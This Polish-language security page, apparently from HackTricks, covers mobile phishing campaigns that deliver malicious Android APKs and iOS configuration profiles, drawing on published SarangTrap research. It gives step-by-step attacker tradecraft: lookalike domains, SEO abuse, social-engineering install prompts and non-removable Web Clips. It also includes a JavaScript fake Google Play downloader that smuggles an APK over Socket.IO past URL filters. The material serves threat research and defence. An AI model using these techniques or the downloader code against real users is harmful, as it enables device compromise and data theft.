# Phishing mobilny i dystrybucja złośliwych aplikacji (Android i iOS)

> [!INFO]
> Ta strona opisuje techniki używane przez threat actors do dystrybucji **złośliwych plików APK dla Androida** i **profili konfiguracji mobilnej iOS** za pomocą phishingu (SEO, inżynieria społeczna, fałszywe sklepy, aplikacje randkowe itp.).
> Materiał został zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.<sup>[[1]](#references)</sup>

## Przebieg ataku

1. **Infrastruktura SEO/phishingowa**
* Zarejestruj dziesiątki podobnie wyglądających domen (randki, udostępnianie w chmurze, serwis samochodowy…).
– Użyj słów kluczowych w lokalnym języku i emoji w elemencie `<title>`, aby uzyskać wyższą pozycję w Google.
– Hostuj instrukcje instalacji zarówno dla Androida (`.apk`), jak i iOS na tej samej stronie docelowej.
2. **Pobranie pierwszego etapu**
* Android: bezpośredni link do *niepodpisanego* pliku APK lub pliku APK z „third-party store”.
* iOS: `itms-services://` lub zwykły link HTTPS do złośliwego profilu **mobileconfig** (zobacz poniżej).
3. **Zachowanie Android malware po instalacji**
* Wykonywanie kontrolowane przez C2, nadużywanie uprawnień, omijanie zabezpieczeń dropperów, zbieranie danych w tle oraz inne zachowania malware po instalacji opisano na poświęconej temu stronie Android Malware Post-Exploitation poniżej.
4. **Technika dostarczania dla iOS**
* Pojedynczy **profil konfiguracji mobilnej** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd., aby zapisać urządzenie do nadzoru w stylu „MDM”.
* Instrukcje wykorzystujące inżynierię społeczną:
1. Otwórz Ustawienia ➜ *Pobrano profil*.
2. Trzykrotnie stuknij *Zainstaluj* (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niepodpisanemu profilowi ➜ attacker uzyskuje uprawnienia do *Kontaktów* i *Zdjęć* bez weryfikacji w App Store.
5. **Ładunek iOS Web Clip (ikona aplikacji phishingowej)**
* Ładunki `com.apple.webClip.managed` mogą **przypiąć URL phishingowy do ekranu głównego** wraz z oznaczoną marką ikoną/etykietą.
* Web Clips mogą działać **na pełnym ekranie** (ukrywając interfejs przeglądarki) i być oznaczone jako **niemożliwe do usunięcia**, zmuszając ofiarę do usunięcia profilu w celu usunięcia ikony.<sup>[[3]](#references)</sup>
6. **Warstwa sieciowa**
* Zwykły HTTP, często na porcie 80 z nagłówkiem HOST takim jak `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Android Malware Post-Exploitation

Informacje o tradecraft malware Androida po instalacji, takim jak C2, nadużywanie Accessibility, nakładki, automatyzacja ATS, ładowanie etapowe DEX, premium SMS i persistence, znajdziesz na stronie:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Przemycanie APK oparte na Socket.IO/WebSocket + fałszywe strony Google Play

Attackers coraz częściej zastępują statyczne linki do plików APK kanałem Socket.IO/WebSocket osadzonym w lure’ach wyglądających jak Google Play. Ukrywa to URL payloadu, omija filtry URL/rozszerzeń i zachowuje realistyczny UX instalacji.<sup>[[2]](#references)[[4]](#references)</sup>

Typowy przepływ klienta zaobserwowany w praktyce:

<details>
<summary>Fałszywy downloader Play oparty na Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste mechanizmy kontroli:
- Nie jest ujawniany żaden statyczny URL do pliku APK; payload jest rekonstruowany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń, które blokują bezpośrednie odpowiedzi .apk, mogą nie wykryć danych binarnych tunelowanych za pomocą WebSocket/Socket.IO.
- Crawler i sandboxy URL, które nie wykonują WebSocket, nie pobiorą payloadu.

Zobacz także tradecraft i narzędzia WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Ciemna strona romansu: kampania wymuszeń SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ustawienia payloadu Web Clips dla urządzeń Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan Banker atakujący użytkowników Androida w Indonezji i Wietnamie](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
